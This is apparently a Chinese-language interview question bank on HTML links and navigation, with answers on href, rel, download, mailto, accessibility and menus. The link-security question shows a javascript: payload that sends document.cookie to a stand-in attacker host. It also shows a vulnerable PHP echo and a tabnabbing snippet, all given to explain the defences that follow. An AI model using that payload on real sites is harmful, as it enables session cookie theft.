# 第 6 章：链接与导航 - 面试题

**难度分布：** 🟢 简单 x3 | 🟡 中等 x4 | 🔴 困难 x3

---

## 第 1 题 🟢

**类型：** 单选题  
**标签：** 链接基础

### 题目

`<a>` 标签的 `href` 属性可以接受哪种类型的 URL？

**选项：**
- A. 仅绝对 URL
- B. 仅相对 URL
- C. 绝对 URL、相对 URL、锚点链接
- D. 仅外部链接

<details>
<summary>查看答案</summary>

### ✅ 正确答案：C

### 📖 解析

**href 支持多种 URL 类型**

**1. 绝对 URL**
```html
<a href="https://example.com">外部网站</a>
<a href="https://example.com/page">外部页面</a>
```

**2. 相对 URL**
```html
<a href="/about">相对根目录</a>
<a href="about.html">相对当前目录</a>
<a href="../index.html">上级目录</a>
```

**3. 锚点链接**
```html
<a href="#section1">页面内锚点</a>
<a href="page.html#section2">其他页面的锚点</a>
```

**4. 协议链接**
```html
<a href="mailto:user@example.com">发邮件</a>
<a href="tel:+8613800138000">打电话</a>
<a href="sms:+8613800138000">发短信</a>
```

**5. JavaScript 伪协议**
```html
<a href="javascript:void(0)">不跳转</a>
<a href="javascript:alert('Hello')">执行 JS</a>
```

**6. 特殊值**
```html
<a href="#">回到顶部（传统用法）</a>
<a href="">刷新当前页</a>
```

**完整示例：**
```html
<!-- 外部链接 -->
<a href="https://google.com" target="_blank" rel="noopener noreferrer">
  Google
</a>

<!-- 内部链接 -->
<a href="/products">产品页面</a>
<a href="about.html">关于我们</a>

<!-- 锚点 -->
<a href="#contact">联系方式</a>

<!-- 协议 -->
<a href="mailto:support@example.com">发送邮件</a>
<a href="tel:+8613800138000">拨打电话</a>

<!-- 下载 -->
<a href="/files/doc.pdf" download>下载文档</a>
```

</details>

---

## 第 2 题 🟢

**类型：** 判断题  
**标签：** target 属性

### 题目

`target="_blank"` 会在新标签页打开链接，且自动设置了安全属性。

**选项：**
- A. ✅ 正确
- B. ❌ 错误

<details>
<summary>查看答案</summary>

### ✅ 正确答案：B（错误）

### 📖 解析

**`target="_blank"` 的安全问题**

**问题：**
```html
<!-- ❌ 不安全 -->
<a href="https://external-site.com" target="_blank">
  外部链接
</a>
```

新打开的页面可以通过 `window.opener` 访问原页面，存在安全风险。

**解决方案：添加 `rel` 属性**
```html
<!-- ✅ 安全 -->
<a href="https://external-site.com" 
   target="_blank" 
   rel="noopener noreferrer">
  外部链接
</a>
```

**rel 属性说明：**
- `noopener`：防止新页面访问 `window.opener`
- `noreferrer`：不发送 Referer 头（更强的隐私保护）

**攻击示例（钓鱼攻击）：**
```javascript
// 恶意网站的代码
if (window.opener) {
  // 可以将原页面重定向到钓鱼网站
  window.opener.location = 'https://phishing-site.com';
}
```

**现代浏览器：**
- Chrome 88+ 等现代浏览器已默认添加 `noopener`
- 但仍推荐显式添加，确保兼容性

**完整最佳实践：**
```html
<!-- 外部链接 -->
<a href="https://example.com" 
   target="_blank" 
   rel="noopener noreferrer">
  外部网站
</a>

<!-- 信任的外部链接（可以省略 noreferrer） -->
<a href="https://trusted-partner.com" 
   target="_blank" 
   rel="noopener">
  合作伙伴
</a>

<!-- 内部链接（通常不需要） -->
<a href="/page" target="_blank">
  内部页面
</a>
```

**target 其他值：**
```html
<a href="/page" target="_self">当前窗口（默认）</a>
<a href="/page" target="_blank">新窗口/标签</a>
<a href="/page" target="_parent">父框架</a>
<a href="/page" target="_top">顶层框架</a>
<a href="/page" target="myframe">指定框架名</a>
```

</details>

---

## 第 3 题 🟢

**类型：** 单选题  
**标签：** 锚点链接

### 题目

如何创建页面内的锚点链接？

**选项：**
- A. `<a href="#section1">` 和 `<div id="section1">`
- B. `<a anchor="section1">` 和 `<div name="section1">`
- C. `<a link="#section1">` 和 `<anchor id="section1">`
- D. `<a name="section1">` 和 `<div href="#section1">`

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A

### 📖 解析

**锚点链接的正确用法**

**基本用法：**
```html
<!-- 1. 创建链接 -->
<a href="#section1">跳转到第一节</a>
<a href="#section2">跳转到第二节</a>

<!-- 2. 创建目标（使用 id） -->
<h2 id="section1">第一节</h2>
<p>内容...</p>

<h2 id="section2">第二节</h2>
<p>内容...</p>
```

**完整示例：**
```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>锚点示例</title>
</head>
<body>
  <!-- 目录 -->
  <nav>
    <h2>目录</h2>
    <ul>
      <li><a href="#intro">简介</a></li>
      <li><a href="#usage">使用方法</a></li>
      <li><a href="#examples">示例</a></li>
    </ul>
  </nav>
  
  <!-- 内容 -->
  <main>
    <section id="intro">
      <h2>简介</h2>
      <p>内容...</p>
    </section>
    
    <section id="usage">
      <h2>使用方法</h2>
      <p>内容...</p>
    </section>
    
    <section id="examples">
      <h2>示例</h2>
      <p>内容...</p>
    </section>
  </main>
  
  <!-- 回到顶部 -->
  <a href="#top">回到顶部</a>
</body>
</html>
```

**其他页面的锚点：**
```html
<a href="page.html#section3">其他页面的某节</a>
```

**平滑滚动：**
```css
html {
  scroll-behavior: smooth;
}
```

**JavaScript 控制：**
```javascript
// 点击平滑滚动
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', function(e) {
    e.preventDefault();
    const target = document.querySelector(this.getAttribute('href'));
    target.scrollIntoView({ behavior: 'smooth' });
  });
});
```

**旧方法（已废弃）：**
```html
<!-- ❌ HTML4 方法，不推荐 -->
<a name="section1"></a>
<h2>第一节</h2>

<!-- ✅ HTML5 推荐 -->
<h2 id="section1">第一节</h2>
```

</details>

---

## 第 4 题 🟡

**类型：** 多选题  
**标签：** download 属性

### 题目

关于 `download` 属性，以下说法正确的是？

**选项：**
- A. 提示浏览器下载资源而不是打开
- B. 可以指定下载的文件名
- C. 仅对同源资源有效
- D. 支持所有类型的文件

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A, B, C

### 📖 解析

**download 属性详解**

**1. 基本用法（A 正确）**
```html
<!-- 提示下载 -->
<a href="/files/document.pdf" download>下载文档</a>

<!-- 不使用 download 会在浏览器中打开 -->
<a href="/files/document.pdf">在浏览器中打开</a>
```

**2. 指定文件名（B 正确）**
```html
<!-- 使用原文件名 -->
<a href="/files/report-2024-01.pdf" download>下载</a>

<!-- 指定下载后的文件名 -->
<a href="/files/report-2024-01.pdf" download="月度报告.pdf">
  下载报告
</a>
```

**3. 同源限制（C 正确）**
```html
<!-- ✅ 同源：正常工作 -->
<a href="/files/doc.pdf" download="文档.pdf">下载</a>

<!-- ❌ 跨域：download 属性被忽略 -->
<a href="https://other-site.com/file.pdf" download>
  下载  <!-- 会在浏览器中打开 -->
</a>
```

**4. 不是所有文件都支持（D 错误）**

浏览器可能会忽略某些类型的文件：
- 跨域资源
- 某些浏览器不支持
- 服务器设置了 Content-Disposition

**实际应用：**

```html
<!-- 图片下载 -->
<a href="/images/photo.jpg" download="我的照片.jpg">
  <img src="/images/photo.jpg" alt="照片">
  <br>下载图片
</a>

<!-- 文档下载 -->
<a href="/docs/manual.pdf" download="用户手册.pdf">
  <svg><!-- 下载图标 --></svg>
  下载用户手册
</a>

<!-- 数据导出 -->
<button onclick="exportData()">导出数据</button>

<script>
function exportData() {
  const data = { name: '张三', age: 25 };
  const json = JSON.stringify(data, null, 2);
  const blob = new Blob([json], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  
  const a = document.createElement('a');
  a.href = url;
  a.download = 'data.json';
  a.click();
  
  URL.revokeObjectURL(url);
}
</script>
```

**跨域下载解决方案：**

```javascript
// 通过 fetch 和 Blob 下载跨域文件
async function downloadCrossOrigin(url, filename) {
  const response = await fetch(url);
  const blob = await response.blob();
  const blobUrl = URL.createObjectURL(blob);
  
  const a = document.createElement('a');
  a.href = blobUrl;
  a.download = filename;
  a.click();
  
  URL.revokeObjectURL(blobUrl);
}

// 使用
downloadCrossOrigin(
  'https://other-site.com/file.pdf',
  'document.pdf'
);
```

**服务器配置：**

```http
# 强制下载
Content-Disposition: attachment; filename="document.pdf"

# 在浏览器中显示
Content-Disposition: inline; filename="document.pdf"
```

</details>

---

## 第 5 题 🟡

**类型：** 代码分析题  
**标签：** 链接样式

### 题目

CSS 中有哪些链接伪类，它们的推荐顺序是什么？

**选项：**
- A. `:link`, `:visited`, `:hover`, `:active`
- B. `:hover`, `:link`, `:visited`, `:active`
- C. `:link`, `:hover`, `:visited`, `:active`
- D. `:visited`, `:link`, `:hover`, `:active`

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A

### 📖 解析

**链接伪类的正确顺序：LVHA**

**记忆口诀：LoVe HAte**
- `:link` - 未访问的链接
- `:visited` - 已访问的链接
- `:hover` - 鼠标悬停
- `:active` - 鼠标点击时

**为什么要按这个顺序？**

CSS 特异性相同时，后面的规则会覆盖前面的。

```css
/* ✅ 正确顺序 */
a:link {
  color: blue;
}

a:visited {
  color: purple;
}

a:hover {
  color: red;
  text-decoration: underline;
}

a:active {
  color: orange;
}
```

**错误顺序的问题：**

```css
/* ❌ 错误：hover 永远不会生效 */
a:hover {
  color: red;
}

a:link {
  color: blue;  /* 覆盖了 hover */
}
```

**完整样式示例：**

```css
/* 基础样式 */
a {
  text-decoration: none;
  transition: color 0.3s;
}

/* LVHA 顺序 */
a:link {
  color: #3b82f6;
}

a:visited {
  color: #8b5cf6;
}

a:hover {
  color: #2563eb;
  text-decoration: underline;
}

a:active {
  color: #1d4ed8;
}

/* 聚焦（键盘导航） */
a:focus {
  outline: 2px solid #3b82f6;
  outline-offset: 2px;
}

/* 取消聚焦样式（不推荐） */
a:focus {
  outline: none;  /* ❌ 影响可访问性 */
}
```

**移除下划线：**

```css
a {
  text-decoration: none;
}

/* 悬停时显示 */
a:hover {
  text-decoration: underline;
}
```

**按钮样式的链接：**

```css
.btn {
  display: inline-block;
  padding: 0.5rem 1rem;
  background: #3b82f6;
  color: white;
  text-decoration: none;
  border-radius: 0.25rem;
}

.btn:hover {
  background: #2563eb;
}

.btn:active {
  background: #1d4ed8;
  transform: translateY(1px);
}
```

**现代 CSS 特性：**

```css
/* :any-link - 匹配 :link 和 :visited */
a:any-link {
  color: blue;
}

/* :focus-visible - 仅键盘聚焦显示 */
a:focus-visible {
  outline: 2px solid blue;
}
```

</details>

---

## 第 6 题 🟡

**类型：** 单选题  
**标签：** rel 属性

### 题目

`rel="nofollow"` 的作用是什么？

**选项：**
- A. 告诉搜索引擎不要跟踪这个链接
- B. 防止新页面访问 window.opener
- C. 不发送 Referer 头
- D. 在新窗口打开

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A

### 📖 解析

**rel 属性的值及作用**

**1. `nofollow` - SEO 相关**
```html
<a href="https://external-site.com" rel="nofollow">
  外部链接
</a>
```

作用：
- 告诉搜索引擎不要跟踪此链接
- 不传递 PageRank（权重）
- 用于用户生成内容、付费链接等

**2. `noopener` - 安全相关**
```html
<a href="https://external-site.com" target="_blank" rel="noopener">
  外部链接
</a>
```

作用：
- 防止新页面通过 `window.opener` 访问原页面
- 安全性

**3. `noreferrer` - 隐私相关**
```html
<a href="https://external-site.com" rel="noreferrer">
  外部链接
</a>
```

作用：
- 不发送 Referer 头
- 更强的隐私保护
- 自动包含 `noopener` 效果

**4. 其他常用 rel 值**

```html
<!-- 替代版本 -->
<link rel="alternate" hreflang="en" href="/en/page">

<!-- 规范链接 -->
<link rel="canonical" href="https://example.com/page">

<!-- 作者 -->
<a href="/author/zhangsan" rel="author">张三</a>

<!-- 标签 -->
<a href="/tag/html" rel="tag">HTML</a>

<!-- 许可证 -->
<a href="/license" rel="license">版权声明</a>

<!-- 帮助 -->
<a href="/help" rel="help">帮助</a>

<!-- 书签 -->
<a href="/bookmark" rel="bookmark">书签</a>

<!-- 搜索 -->
<link rel="search" href="/search.xml">

<!-- 预加载资源 -->
<link rel="preload" href="font.woff2" as="font">
<link rel="prefetch" href="next-page.html">
<link rel="preconnect" href="https://fonts.googleapis.com">
```

**组合使用：**

```html
<!-- UGC 链接 -->
<a href="https://spam-site.com" rel="nofollow noopener">
  用户提交的链接
</a>

<!-- 付费链接 -->
<a href="https://sponsor.com" rel="sponsored noopener">
  赞助商
</a>

<!-- 外部链接最佳实践 -->
<a href="https://external-site.com" 
   target="_blank" 
   rel="noopener noreferrer">
  外部网站
</a>
```

**实际应用场景：**

```html
<!-- 博客评论中的链接 -->
<a href="https://user-site.com" rel="nofollow ugc noopener">
  用户网站
</a>

<!-- 付费广告 -->
<a href="https://advertiser.com" rel="sponsored noopener">
  广告链接
</a>

<!-- 信任的外部链接 -->
<a href="https://trusted-partner.com" rel="noopener">
  合作伙伴
</a>

<!-- 内部链接（通常不需要 rel） -->
<a href="/page">内部页面</a>
```

**rel 值总结：**

| 值 | 用途 | 场景 |
|---|------|------|
| `nofollow` | SEO | 不信任的链接 |
| `noopener` | 安全 | target="_blank" |
| `noreferrer` | 隐私 | 隐藏来源 |
| `sponsored` | SEO | 付费链接 |
| `ugc` | SEO | 用户生成内容 |

</details>

---

## 第 7 题 🟡

**类型：** 多选题  
**标签：** 链接可访问性

### 题目

为了提升链接的可访问性，应该采取哪些措施？

**选项：**
- A. 使用有意义的锚文本，避免"点击这里"
- B. 确保链接有足够的视觉对比度
- C. 为图片链接添加 alt 属性
- D. 使用 `title` 属性提供额外信息

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A, B, C, D

### 📖 解析

**链接可访问性最佳实践（全部正确）**

**1. 有意义的锚文本（A 正确）**

```html
<!-- ❌ 不好：无意义 -->
<a href="/article">点击这里</a>
<a href="/learn-more">了解更多</a>
<a href="/read">阅读</a>

<!-- ✅ 好：描述性 -->
<a href="/article">阅读完整文章：深入理解闭包</a>
<a href="/products">查看产品列表</a>
<a href="/contact">联系我们获取更多信息</a>
```

**2. 视觉对比度（B 正确）**

```css
/* ✅ 良好的对比度 */
a {
  color: #0066cc;  /* 与白色背景对比度 > 4.5:1 */
}

a:visited {
  color: #551a8b;
}

/* ❌ 对比度不足 */
a {
  color: #ccc;  /* 浅灰色，难以辨认 */
}

/* 聚焦指示器 */
a:focus {
  outline: 2px solid #0066cc;
  outline-offset: 2px;
}
```

**3. 图片链接（C 正确）**

```html
<!-- ✅ 有 alt 文本 -->
<a href="/products">
  <img src="products-icon.png" alt="查看产品列表">
</a>

<!-- ✅ 图标 + 文本 -->
<a href="/home">
  <svg aria-hidden="true"><!-- 图标 --></svg>
  <span>首页</span>
</a>

<!-- ✅ 隐藏文本（视觉上不可见，屏幕阅读器可读） -->
<a href="/search">
  <svg><!-- 搜索图标 --></svg>
  <span class="sr-only">搜索</span>
</a>

<style>
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
</style>
```

**4. title 属性（D 正确）**

```html
<!-- 提供额外信息 -->
<a href="/privacy" title="了解我们如何保护您的隐私">
  隐私政策
</a>

<!-- 长链接文本的简化 -->
<a href="/article" title="深入理解JavaScript闭包：原理、应用与最佳实践">
  阅读文章
</a>

<!-- ⚠️ 注意：不要仅依赖 title -->
<!-- title 在触摸设备上不可见 -->
```

**完整的可访问链接示例：**

```html
<nav aria-label="主导航">
  <ul>
    <li>
      <a href="/" aria-current="page">首页</a>
    </li>
    <li>
      <a href="/products">产品</a>
    </li>
    <li>
      <a href="/about">关于我们</a>
    </li>
  </ul>
</nav>

<style>
nav a {
  display: block;
  padding: 0.5rem 1rem;
  color: #0066cc;
  text-decoration: none;
  border-radius: 0.25rem;
}

nav a:hover {
  background: #f0f0f0;
  text-decoration: underline;
}

nav a:focus {
  outline: 2px solid #0066cc;
  outline-offset: 2px;
}

nav a[aria-current="page"] {
  font-weight: bold;
  background: #e6f2ff;
}
</style>
```

**外部链接指示：**

```html
<!-- 视觉提示 -->
<a href="https://external.com" target="_blank" rel="noopener">
  外部网站
  <svg aria-label="(在新窗口打开)"><!-- 外部链接图标 --></svg>
</a>

<!-- 或使用文本 -->
<a href="https://external.com" target="_blank" rel="noopener">
  外部网站
  <span class="sr-only">(在新窗口打开)</span>
</a>
```

**跳过导航链接：**

```html
<a href="#main-content" class="skip-link">
  跳过导航，直接到主要内容
</a>

<nav>
  <!-- 导航链接 -->
</nav>

<main id="main-content">
  <!-- 主要内容 -->
</main>

<style>
.skip-link {
  position: absolute;
  top: -40px;
  left: 0;
  background: #000;
  color: #fff;
  padding: 8px;
  text-decoration: none;
}

.skip-link:focus {
  top: 0;
}
</style>
```

</details>

---

## 第 8 题 🔴

**类型：** 代码补全题  
**标签：** 邮件链接

### 题目

创建一个包含主题、抄送、密送和正文的邮件链接。

```html
<a href="mailto:____">发送邮件</a>
```

<details>
<summary>查看答案</summary>

### ✅ 正确答案

```html
<a href="mailto:support@example.com?subject=咨询问题&cc=manager@example.com&bcc=archive@example.com&body=您好，我想咨询...">
  发送邮件
</a>
```

### 📖 解析

**mailto 链接的完整语法**

**基本格式：**
```
mailto:邮箱地址?参数1=值1&参数2=值2
```

**支持的参数：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `subject` | 主题 | `subject=咨询` |
| `cc` | 抄送 | `cc=user@example.com` |
| `bcc` | 密送 | `bcc=hidden@example.com` |
| `body` | 正文 | `body=您好` |

**示例1：基本邮件**
```html
<a href="mailto:support@example.com">
  发送邮件
</a>
```

**示例2：带主题**
```html
<a href="mailto:support@example.com?subject=产品咨询">
  咨询产品
</a>
```

**示例3：多个收件人**
```html
<a href="mailto:user1@example.com,user2@example.com?subject=会议邀请">
  发送给多人
</a>
```

**示例4：完整参数**
```html
<a href="mailto:support@example.com?subject=Bug报告&cc=dev@example.com&bcc=archive@example.com&body=描述Bug：%0A1.%20步骤%0A2.%20结果">
  报告Bug
</a>
```

**URL 编码：**

```html
<!-- 中文和特殊字符需要编码 -->
<a href="mailto:support@example.com?subject=产品咨询&body=您好，%0A我想了解产品详情。%0A%0A谢谢！">
  发送邮件
</a>

<!-- %0A = 换行符 -->
<!-- %20 = 空格 -->
```

**JavaScript 生成：**

```javascript
function createMailtoLink(options) {
  const {
    to,
    cc = '',
    bcc = '',
    subject = '',
    body = ''
  } = options;
  
  const params = [];
  
  if (subject) params.push(`subject=${encodeURIComponent(subject)}`);
  if (cc) params.push(`cc=${encodeURIComponent(cc)}`);
  if (bcc) params.push(`bcc=${encodeURIComponent(bcc)}`);
  if (body) params.push(`body=${encodeURIComponent(body)}`);
  
  const queryString = params.length > 0 ? '?' + params.join('&') : '';
  
  return `mailto:${to}${queryString}`;
}

// 使用
const link = createMailtoLink({
  to: 'support@example.com',
  subject: '产品咨询',
  cc: 'manager@example.com',
  body: '您好，\n我想了解产品详情。\n\n谢谢！'
});

console.log(link);
// mailto:support@example.com?subject=%E4%BA%A7%E5%93%81%E5%92%A8%E8%AF%A2&cc=manager@example.com&body=%E6%82%A8%E5%A5%BD%EF%BC%8C%0A%E6%88%91%E6%83%B3%E4%BA%86%E8%A7%A3%E4%BA%A7%E5%93%81%E8%AF%A6%E6%83%85%E3%80%82%0A%0A%E8%B0%A2%E8%B0%A2%EF%BC%81
```

**实际应用：**

```html
<!-- 联系表单替代 -->
<div class="contact">
  <h2>联系我们</h2>
  <p>
    <a href="mailto:support@example.com?subject=咨询&body=请填写您的问题：%0A%0A">
      发送邮件咨询
    </a>
  </p>
</div>

<!-- 分享功能 -->
<a href="mailto:?subject=分享：有趣的文章&body=我发现了一篇有趣的文章：%0Ahttps://example.com/article">
  通过邮件分享
</a>

<!-- 反馈按钮 -->
<a href="mailto:feedback@example.com?subject=网站反馈&body=页面：' + location.href + '%0A%0A反馈内容：%0A"
   class="feedback-btn">
  提交反馈
</a>
```

**注意事项：**
- ⚠️ 会调用用户的默认邮件客户端
- ⚠️ 用户可能没有配置邮件客户端
- ⚠️ 邮件地址会暴露给爬虫（考虑防爬）
- ✅ 提供替代联系方式

</details>

---

## 第 9 题 🔴

**类型：** 多选题  
**标签：** 链接安全

### 题目

关于链接安全，以下说法正确的是？

**选项：**
- A. `target="_blank"` 应配合 `rel="noopener"`
- B. 用户输入的 URL 应该验证和清理
- C. 可以使用 JavaScript 伪协议执行代码
- D. `href="javascript:void(0)"` 是安全的

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A, B

### 📖 解析

**链接安全最佳实践**

**1. target="_blank" 安全（A 正确）**

```html
<!-- ❌ 不安全 -->
<a href="https://evil-site.com" target="_blank">
  点击
</a>

<!-- ✅ 安全 -->
<a href="https://external-site.com" 
   target="_blank" 
   rel="noopener noreferrer">
  外部链接
</a>
```

**攻击示例：**
```javascript
// 恶意网站代码
if (window.opener) {
  window.opener.location = 'https://phishing-site.com';
}
```

**2. URL 验证（B 正确）**

```javascript
// ❌ 不安全：直接使用用户输入
const userUrl = getUserInput();
link.href = userUrl;  // 可能是 javascript: 协议

// ✅ 安全：验证协议
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, window.location.href);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (isSafeUrl(userUrl)) {
  link.href = userUrl;
} else {
  console.error('不安全的 URL');
}
```

**3. JavaScript 伪协议（C、D 错误）**

```html
<!-- ❌ 危险：XSS 攻击向量 -->
<a href="javascript:alert(document.cookie)">点击</a>
<a href="javascript:void(0)" onclick="doSomething()">操作</a>

<!-- ✅ 安全替代 -->
<button onclick="doSomething()">操作</button>

<!-- 或 -->
<a href="#" onclick="doSomething(); return false;">操作</a>
```

**XSS 攻击示例：**

```html
<!-- 用户输入的链接 -->
<?php echo '<a href="' . $_GET['url'] . '">链接</a>'; ?>

<!-- 恶意 URL -->
?url=javascript:fetch('https://attacker.com?cookie='+document.cookie)

<!-- 生成的 HTML（XSS） -->
<a href="javascript:fetch('https://attacker.com?cookie='+document.cookie)">链接</a>
```

**安全措施：**

```javascript
// 1. 白名单协议
function sanitizeUrl(url) {
  const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
  
  try {
    const parsed = new URL(url, window.location.href);
    if (allowedProtocols.includes(parsed.protocol)) {
      return parsed.href;
    }
  } catch (e) {
    // 无效 URL
  }
  
  return '#';  // 默认安全值
}

// 2. 转义HTML
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 3. 使用 DOMPurify
const clean = DOMPurify.sanitize(userInput);
```

**完整防御：**

```html
<!-- 服务器端 -->
<?php
function sanitizeUrl($url) {
    $parsed = parse_url($url);
    if (!in_array($parsed['scheme'] ?? '', ['http', 'https'])) {
        return '#';
    }
    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}

echo '<a href="' . sanitizeUrl($_GET['url']) . '">链接</a>';
?>

<!-- 客户端 -->
<script>
// CSP 策略
// Content-Security-Policy: default-src 'self'; script-src 'self'

document.querySelectorAll('a[href^="javascript:"]').forEach(link => {
  console.warn('发现不安全的链接:', link);
  link.href = '#';
  link.onclick = null;
});
</script>
```

**最佳实践总结：**
- ✅ `target="_blank"` 加 `rel="noopener"`
- ✅ 验证用户输入的 URL
- ✅ 避免 `javascript:` 协议
- ✅ 使用 CSP（Content Security Policy）
- ✅ 转义 HTML 输出
- ❌ 不要信任用户输入

</details>

---

## 第 10 题 🔴

**类型：** 综合分析题  
**标签：** 导航最佳实践

### 题目

设计一个可访问的、SEO 友好的主导航，包含多级菜单。要求包含：
1. 语义化标签
2. ARIA 属性
3. 键盘导航
4. 当前页面标记

<details>
<summary>查看答案</summary>

### 📖 解析

**完整的可访问导航实现**

**HTML 结构：**

```html
<nav aria-label="主导航" role="navigation">
  <ul role="menubar">
    <!-- 首页 -->
    <li role="none">
      <a href="/" 
         role="menuitem"
         aria-current="page"
         tabindex="0">
        首页
      </a>
    </li>
    
    <!-- 产品（有子菜单） -->
    <li role="none">
      <a href="/products"
         role="menuitem"
         aria-haspopup="true"
         aria-expanded="false"
         tabindex="-1">
        产品
        <svg aria-hidden="true"><!-- 下拉箭头 --></svg>
      </a>
      
      <!-- 子菜单 -->
      <ul role="menu" aria-label="产品子菜单" hidden>
        <li role="none">
          <a href="/products/phones" role="menuitem" tabindex="-1">
            手机
          </a>
        </li>
        <li role="none">
          <a href="/products/computers" role="menuitem" tabindex="-1">
            电脑
          </a>
        </li>
        <li role="none">
          <a href="/products/accessories" role="menuitem" tabindex="-1">
            配件
          </a>
        </li>
      </ul>
    </li>
    
    <!-- 关于 -->
    <li role="none">
      <a href="/about"
         role="menuitem"
         tabindex="-1">
        关于我们
      </a>
    </li>
  </ul>
</nav>
```

**CSS 样式：**

```css
/* 重置列表样式 */
nav ul {
  list-style: none;
  padding: 0;
  margin: 0;
}

/* 主菜单 */
nav > ul {
  display: flex;
  gap: 0;
  background: #333;
}

nav > ul > li {
  position: relative;
}

/* 链接样式 */
nav a {
  display: block;
  padding: 1rem 1.5rem;
  color: #fff;
  text-decoration: none;
  transition: background 0.3s;
}

nav a:hover,
nav a:focus {
  background: #555;
  outline: none;
}

/* 当前页面 */
nav a[aria-current="page"] {
  background: #0066cc;
  font-weight: bold;
}

/* 聚焦指示器 */
nav a:focus-visible {
  outline: 2px solid #fff;
  outline-offset: -2px;
}

/* 子菜单 */
nav ul ul {
  position: absolute;
  top: 100%;
  left: 0;
  min-width: 200px;
  background: #444;
  box-shadow: 0 4px 8px rgba(0,0,0,0.3);
}

nav ul ul[hidden] {
  display: none;
}

/* 子菜单链接 */
nav ul ul a {
  padding: 0.75rem 1.5rem;
}

nav ul ul a:hover,
nav ul ul a:focus {
  background: #555;
}

/* 箭头 */
nav a[aria-haspopup] svg {
  width: 12px;
  height: 12px;
  margin-left: 0.5rem;
  transition: transform 0.3s;
}

nav a[aria-expanded="true"] svg {
  transform: rotate(180deg);
}
```

**JavaScript 交互：**

```javascript
class AccessibleNav {
  constructor(nav) {
    this.nav = nav;
    this.menuItems = nav.querySelectorAll('[role="menuitem"]');
    this.currentIndex = 0;
    
    this.init();
  }
  
  init() {
    // 键盘导航
    this.menuItems.forEach((item, index) => {
      item.addEventListener('keydown', (e) => this.handleKeyDown(e, index));
      item.addEventListener('click', (e) => this.handleClick(e, item));
    });
    
    // 关闭子菜单（点击外部）
    document.addEventListener('click', (e) => {
      if (!this.nav.contains(e.target)) {
        this.closeAllSubmenus();
      }
    });
  }
  
  handleKeyDown(e, index) {
    const item = this.menuItems[index];
    const hasSubmenu = item.getAttribute('aria-haspopup') === 'true';
    const submenu = item.nextElementSibling;
    
    switch(e.key) {
      case 'ArrowRight':
        // 下一个菜单项
        this.focusNextItem(index);
        e.preventDefault();
        break;
        
      case 'ArrowLeft':
        // 上一个菜单项
        this.focusPrevItem(index);
        e.preventDefault();
        break;
        
      case 'ArrowDown':
        if (hasSubmenu) {
          // 打开子菜单
          this.openSubmenu(item, submenu);
          e.preventDefault();
        }
        break;
        
      case 'ArrowUp':
        if (hasSubmenu) {
          // 关闭子菜单
          this.closeSubmenu(item, submenu);
          e.preventDefault();
        }
        break;
        
      case 'Escape':
        // 关闭所有子菜单
        this.closeAllSubmenus();
        e.preventDefault();
        break;
        
      case 'Enter':
      case ' ':
        if (hasSubmenu) {
          // 切换子菜单
          this.toggleSubmenu(item, submenu);
          e.preventDefault();
        }
        break;
    }
  }
  
  handleClick(e, item) {
    const hasSubmenu = item.getAttribute('aria-haspopup') === 'true';
    if (hasSubmenu) {
      e.preventDefault();
      const submenu = item.nextElementSibling;
      this.toggleSubmenu(item, submenu);
    }
  }
  
  focusNextItem(currentIndex) {
    const nextIndex = (currentIndex + 1) % this.menuItems.length;
    this.menuItems[nextIndex].focus();
    this.menuItems[nextIndex].tabIndex = 0;
    this.menuItems[currentIndex].tabIndex = -1;
  }
  
  focusPrevItem(currentIndex) {
    const prevIndex = (currentIndex - 1 + this.menuItems.length) % this.menuItems.length;
    this.menuItems[prevIndex].focus();
    this.menuItems[prevIndex].tabIndex = 0;
    this.menuItems[currentIndex].tabIndex = -1;
  }
  
  openSubmenu(item, submenu) {
    if (!submenu) return;
    
    item.setAttribute('aria-expanded', 'true');
    submenu.hidden = false;
    
    // 聚焦第一个子项
    const firstItem = submenu.querySelector('[role="menuitem"]');
    if (firstItem) {
      firstItem.focus();
      firstItem.tabIndex = 0;
    }
  }
  
  closeSubmenu(item, submenu) {
    if (!submenu) return;
    
    item.setAttribute('aria-expanded', 'false');
    submenu.hidden = true;
    
    // 返回聚焦到父项
    item.focus();
  }
  
  toggleSubmenu(item, submenu) {
    const isExpanded = item.getAttribute('aria-expanded') === 'true';
    if (isExpanded) {
      this.closeSubmenu(item, submenu);
    } else {
      this.openSubmenu(item, submenu);
    }
  }
  
  closeAllSubmenus() {
    this.nav.querySelectorAll('[aria-expanded]').forEach(item => {
      item.setAttribute('aria-expanded', 'false');
      const submenu = item.nextElementSibling;
      if (submenu) {
        submenu.hidden = true;
      }
    });
  }
}

// 初始化
document.addEventListener('DOMContentLoaded', () => {
  const nav = document.querySelector('nav[aria-label="主导航"]');
  if (nav) {
    new AccessibleNav(nav);
  }
});
```

**响应式移动端：**

```css
@media (max-width: 768px) {
  /* 汉堡菜单按钮 */
  .menu-toggle {
    display: block;
    background: #333;
    color: #fff;
    border: none;
    padding: 1rem;
  }
  
  /* 主菜单垂直排列 */
  nav > ul {
    flex-direction: column;
    display: none;
  }
  
  nav > ul.active {
    display: flex;
  }
  
  /* 子菜单 */
  nav ul ul {
    position: static;
    box-shadow: none;
    background: #555;
  }
}
```

**特性总结：**
- ✅ 语义化：`<nav>`, `<ul>`, `<li>`, `<a>`
- ✅ ARIA：`role`, `aria-label`, `aria-current`, `aria-expanded`
- ✅ 键盘导航：箭头键、Enter、Escape
- ✅ 焦点管理：`tabindex`
- ✅ 当前页面：`aria-current="page"`
